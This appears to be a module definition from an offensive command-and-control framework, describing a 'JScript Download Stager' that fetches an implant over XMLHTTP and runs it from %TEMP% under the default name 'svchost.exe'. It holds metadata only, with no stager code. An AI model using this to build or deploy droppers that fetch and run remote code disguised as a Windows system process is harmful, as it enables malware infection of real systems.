({
    name:        "JScript Download Stager",
    description: "Downloads implant via XMLHTTP and executes from %TEMP%",
    type:        "stager",
    format:      "jscript",
    template:    "stager.js",
    variables: {
        URL:      { description: "Implant download URL", required: true },
        FILENAME: { description: "Filename to write in %TEMP%", default: "svchost.exe" },
    },
})
